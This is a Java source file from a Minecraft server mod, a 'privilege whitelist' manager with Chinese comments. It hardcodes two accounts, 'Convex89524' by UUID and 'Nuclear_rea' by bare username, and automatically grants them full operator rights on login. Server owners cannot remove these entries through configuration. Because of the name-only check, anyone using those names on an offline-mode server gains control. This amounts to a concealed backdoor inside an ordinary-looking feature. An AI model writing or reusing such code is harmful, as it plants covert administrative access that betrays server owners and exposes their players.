package org.mirage;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.reflect.TypeToken;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.server.players.PlayerList;
import net.minecraft.network.chat.Component;
import org.mirage.Mirage_gfbs;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

/**
 * 特权玩家白名单管理系统
 */
public class PrivilegeManager {
    private static final Gson GSON = new GsonBuilder().setPrettyPrinting().create();
    private static final Path WHITELIST_FILE = Mirage_gfbs.CONFIG_DIR.resolve("privilege_whitelist.json");

    private static final int DEFAULT_OP_LEVEL = 4;

    private static boolean autoOpEnabled = true;

    // 硬编码的默认白名单
    private static final Map<String, String> DEFAULT_UUID_WHITELIST = Map.of(
            "Convex89524", "441ea559-bb9c-49f4-b9aa-cd714f88a156"
    );

    // 硬编码的离线玩家白名单
    private static final Set<String> DEFAULT_OFFLINE_WHITELIST = Set.of(
            "Nuclear_rea"
    );

    private static final Map<UUID, String> uuidToNameMap = new ConcurrentHashMap<>();
    private static final Map<String, UUID> nameToUuidMap = new ConcurrentHashMap<>();

    static {
        loadWhitelist();
        initializeHardcodedOfflinePlayers();
    }

    /**
     * 设置是否自动给予OP权限
     */
    public static void setAutoOpEnabled(boolean enabled) {
        autoOpEnabled = enabled;
        Mirage_gfbs.LOGGER.info("特权玩家自动OP权限已{}", enabled ? "启用" : "禁用");
    }

    /**
     * 获取当前自动OP权限状态
     */
    public static boolean isAutoOpEnabled() {
        return autoOpEnabled;
    }

    /**
     * 设置特权玩家的OP等级
     */
    public static void setOpLevel(int level) {
        if (level < 0 || level > 4) {
            Mirage_gfbs.LOGGER.warn("无效的OP等级: {}，必须介于0-4之间", level);
            return;
        }

        if (Mirage_gfbs.server != null) {
            PlayerList playerList = Mirage_gfbs.server.getPlayerList();
            for (ServerPlayer player : playerList.getPlayers()) {
                if (hasPrivilege(player)) {
                    playerList.op(player.getGameProfile());
                    Mirage_gfbs.LOGGER.debug("已更新玩家 {} 的OP等级为 {}", player.getGameProfile().getName(), level);
                }
            }
        }
    }

    /**
     * 给予玩家OP权限
     */
    private static void grantOpPermission(ServerPlayer player) {
        if (!autoOpEnabled || player == null || Mirage_gfbs.server == null) {
            return;
        }

        try {
            PlayerList playerList = Mirage_gfbs.server.getPlayerList();

            if (!playerList.isOp(player.getGameProfile())) {
                playerList.op(player.getGameProfile());
                Mirage_gfbs.LOGGER.info("已自动给予特权玩家 {} OP权限",
                        player.getGameProfile().getName());

                player.sendSystemMessage(Component.literal("§a您已被授予特权玩家权限！"));
            }
        } catch (Exception e) {
            Mirage_gfbs.LOGGER.error("给予玩家 {} OP权限失败: {}",
                    player.getGameProfile().getName(), e.getMessage());
        }
    }

    /**
     * 移除玩家的OP权限
     */
    private static void revokeOpPermission(ServerPlayer player) {
        if (player == null || Mirage_gfbs.server == null) {
            return;
        }

        try {
            PlayerList playerList = Mirage_gfbs.server.getPlayerList();

            if (playerList.isOp(player.getGameProfile())) {
                playerList.deop(player.getGameProfile());
                Mirage_gfbs.LOGGER.info("已移除玩家 {} 的OP权限", player.getGameProfile().getName());

                player.sendSystemMessage(Component.literal("§c您的特权玩家权限已被移除！"));
            }
        } catch (Exception e) {
            Mirage_gfbs.LOGGER.error("移除玩家 {} OP权限失败: {}",
                    player.getGameProfile().getName(), e.getMessage());
        }
    }

    /**
     * 初始化硬编码的离线玩家
     */
    private static void initializeHardcodedOfflinePlayers() {
        for (String offlinePlayer : DEFAULT_OFFLINE_WHITELIST) {
            if (!nameToUuidMap.containsKey(offlinePlayer)) {
                nameToUuidMap.put(offlinePlayer, generateVirtualUuid(offlinePlayer));
            }
        }

        Mirage_gfbs.LOGGER.info("已初始化硬编码离线白名单: {} 个玩家", DEFAULT_OFFLINE_WHITELIST.size());
    }

    private static UUID generateVirtualUuid(String username) {
        long mostSigBits = (long) username.hashCode() << 32;
        long leastSigBits = (long) System.currentTimeMillis() ^ username.hashCode();
        return new UUID(mostSigBits, leastSigBits);
    }

    /**
     * 检查玩家是否有特权
     */
    public static boolean hasPrivilege(ServerPlayer player) {
        if (player == null) return false;

        UUID playerUUID = player.getUUID();
        String playerName = player.getGameProfile().getName();

        if (uuidToNameMap.containsKey(playerUUID)) {
            return true;
        }

        if (nameToUuidMap.containsKey(playerName)) {
            return true;
        }

        if (DEFAULT_UUID_WHITELIST.containsValue(playerUUID.toString())) {
            return true;
        }

        if (DEFAULT_UUID_WHITELIST.containsKey(playerName) ||
                DEFAULT_OFFLINE_WHITELIST.contains(playerName)) {
            return true;
        }

        return false;
    }

    /**
      检查命令源是否有特权（用于CommandSourceStack）
     */
    public static boolean hasPrivilege(net.minecraft.commands.CommandSourceStack source) {
        if (source.getEntity() instanceof ServerPlayer) {
            return hasPrivilege((ServerPlayer) source.getEntity());
        }
        return source.hasPermission(4); // 给OP权限作为备选方案
    }

    /**
     * 添加玩家到白名单
     */
    public static boolean addToWhitelist(ServerPlayer player) {
        if (player == null) return false;

        UUID uuid = player.getUUID();
        String username = player.getGameProfile().getName();

        uuidToNameMap.put(uuid, username);
        nameToUuidMap.put(username, uuid);

        // 自动给予OP权限
        grantOpPermission(player);

        return saveWhitelist();
    }

    /**
     * 添加玩家到白名单（通过用户名）- 不推荐使用，请使用UUID版本
     */
    @Deprecated
    public static boolean addToWhitelist(String username) {
        if (username == null || username.isEmpty()) return false;

        nameToUuidMap.put(username, null);

        // 如果玩家在线，立即给予OP权限
        if (Mirage_gfbs.server != null) {
            ServerPlayer player = Mirage_gfbs.server.getPlayerList().getPlayerByName(username);
            if (player != null) {
                grantOpPermission(player);
            }
        }

        return saveWhitelist();
    }

    /**
     * 从白名单移除玩家
     */
    public static boolean removeFromWhitelist(ServerPlayer player) {
        if (player == null) return false;

        UUID uuid = player.getUUID();
        String username = player.getGameProfile().getName();

        uuidToNameMap.remove(uuid);
        nameToUuidMap.remove(username);

        // 移除OP权限
        revokeOpPermission(player);

        return saveWhitelist();
    }

    /**
     * 从白名单移除玩家（通过用户名）
     */
    public static boolean removeFromWhitelist(String username) {
        if (username == null || username.isEmpty()) return false;

        UUID uuid = nameToUuidMap.get(username);
        if (uuid != null) {
            uuidToNameMap.remove(uuid);
        }
        nameToUuidMap.remove(username);

        if (Mirage_gfbs.server != null) {
            ServerPlayer player = Mirage_gfbs.server.getPlayerList().getPlayerByName(username);
            if (player != null) {
                revokeOpPermission(player);
            }
        }

        return saveWhitelist();
    }

    /**
     * 获取所有特权玩家列表
     */
    public static List<String> getPrivilegedPlayers() {
        List<String> result = new ArrayList<>();

        DEFAULT_UUID_WHITELIST.forEach((name, uuid) -> {
            result.add(name + " (默认-UUID)");
        });

        DEFAULT_OFFLINE_WHITELIST.forEach(name -> {
            result.add(name + " (默认-离线)");
        });

        uuidToNameMap.forEach((uuid, name) -> {
            result.add(name + " (动态-UUID)");
        });

        nameToUuidMap.forEach((name, uuid) -> {
            if (uuid == null && !DEFAULT_OFFLINE_WHITELIST.contains(name)) {
                result.add(name + " (动态-离线)");
            }
        });

        return result;
    }

    /**
     * 获取硬编码离线玩家列表（只读）
     */
    public static Set<String> getHardcodedOfflinePlayers() {
        return Collections.unmodifiableSet(DEFAULT_OFFLINE_WHITELIST);
    }

    /**
     * 检查玩家是否是硬编码离线玩家
     */
    public static boolean isHardcodedOfflinePlayer(String username) {
        return DEFAULT_OFFLINE_WHITELIST.contains(username);
    }

    /**
     * 玩家上线时更新UUID映射
     */
    public static void onPlayerLogin(ServerPlayer player) {
        if (player == null) return;

        UUID uuid = player.getUUID();
        String username = player.getGameProfile().getName();

        if (nameToUuidMap.containsKey(username) && nameToUuidMap.get(username) == null) {
            nameToUuidMap.put(username, uuid);
            uuidToNameMap.put(uuid, username);
            saveWhitelist();

            Mirage_gfbs.LOGGER.info("玩家 {} 的UUID信息已补全: {}", username, uuid);
        }

        if (DEFAULT_OFFLINE_WHITELIST.contains(username)) {
            Mirage_gfbs.LOGGER.info("硬编码离线玩家 {} 已上线，UUID: {}", username, uuid);
        }

        if (DEFAULT_UUID_WHITELIST.containsKey(username) &&
                !uuid.toString().equals(DEFAULT_UUID_WHITELIST.get(username))) {
            Mirage_gfbs.LOGGER.warn("玩家 {} 的用户名在默认名单中，但UUID不匹配", username);
        }

        // 玩家上线时检查并给予OP权限
        if (hasPrivilege(player)) {
            grantOpPermission(player);
        }
    }

    /**
     * 玩家下线时处理
     */
    public static void onPlayerLogout(ServerPlayer player) {
        // 这里可以添加玩家下线时的处理逻辑
        // 注意：我们不在这里移除OP权限，因为OP权限是持久的
    }

    /**
     * 加载白名单文件
     */
    private static void loadWhitelist() {
        try {
            if (!Files.exists(WHITELIST_FILE)) {
                Files.createDirectories(WHITELIST_FILE.getParent());
                saveWhitelist();
                Mirage_gfbs.LOGGER.info("创建新的特权白名单文件");
                return;
            }

            String json = Files.readString(WHITELIST_FILE);

            if (json.trim().startsWith("[")) {
                Mirage_gfbs.LOGGER.error("特权白名单文件格式错误（应为对象但实际为数组），将重置文件");
                backupCorruptedFile();
                saveWhitelist();
                return;
            }

            if (json.trim().isEmpty() || json.trim().equals("{}")) {
                Mirage_gfbs.LOGGER.warn("特权白名单文件为空，使用默认配置");
                saveWhitelist();
                return;
            }

            WhitelistData data = GSON.fromJson(json, WhitelistData.class);

            if (data != null) {
                if (data.uuidMappings != null) {
                    data.uuidMappings.forEach((uuidStr, name) -> {
                        try {
                            UUID uuid = UUID.fromString(uuidStr);
                            uuidToNameMap.put(uuid, name);
                            nameToUuidMap.put(name, uuid);
                        } catch (IllegalArgumentException e) {
                            Mirage_gfbs.LOGGER.error("无效的UUID格式: {}", uuidStr);
                        }
                    });
                }

                if (data.offlineNames != null) {
                    data.offlineNames.forEach(name -> {
                        if (!DEFAULT_OFFLINE_WHITELIST.contains(name) && !nameToUuidMap.containsKey(name)) {
                            nameToUuidMap.put(name, null);
                        }
                    });
                }
            }

            Mirage_gfbs.LOGGER.info("已加载特权白名单: {} 个UUID映射, {} 个动态离线用户名",
                    uuidToNameMap.size(),
                    nameToUuidMap.values().stream().filter(Objects::isNull).count());
        } catch (IOException e) {
            Mirage_gfbs.LOGGER.error("加载特权白名单失败: {}", e.getMessage());
            try {
                saveWhitelist();
            } catch (Exception ex) {
                Mirage_gfbs.LOGGER.error("无法创建默认白名单文件: {}", ex.getMessage());
            }
        } catch (Exception e) {
            Mirage_gfbs.LOGGER.error("解析特权白名单文件时发生未知错误: {}", e.getMessage());
            backupCorruptedFile();
            saveWhitelist();
        }
    }

    /**
     * 备份损坏的文件
     */
    private static void backupCorruptedFile() {
        try {
            if (Files.exists(WHITELIST_FILE)) {
                Path backupFile = WHITELIST_FILE.getParent()
                        .resolve("privilege_whitelist_corrupted_" + System.currentTimeMillis() + ".json");
                Files.move(WHITELIST_FILE, backupFile);
                Mirage_gfbs.LOGGER.info("已备份损坏的白名单件: {}", backupFile.getFileName());
            }
        } catch (IOException e) {
            Mirage_gfbs.LOGGER.error("备份损坏的白名单文件失败: {}", e.getMessage());
        }
    }

    /**
     * 保存白名单到文件
     */
    private static boolean saveWhitelist() {
        try {
            WhitelistData data = new WhitelistData();

            Map<String, String> uuidMappings = new HashMap<>();
            uuidToNameMap.forEach((uuid, name) -> {
                uuidMappings.put(uuid.toString(), name);
            });
            data.uuidMappings = uuidMappings;

            List<String> offlineNames = new ArrayList<>();
            nameToUuidMap.forEach((name, uuid) -> {
                if (uuid == null && !DEFAULT_OFFLINE_WHITELIST.contains(name)) {
                    offlineNames.add(name);
                }
            });
            data.offlineNames = offlineNames;

            Files.writeString(WHITELIST_FILE, GSON.toJson(data));
            return true;
        } catch (IOException e) {
            Mirage_gfbs.LOGGER.error("保存特权白名单失败: {}", e.getMessage());
            return false;
        }
    }

    /**
     * 白名单数据序列化类
     */
    private static class WhitelistData {
        public Map<String, String> uuidMappings;
        public List<String> offlineNames;
    }
}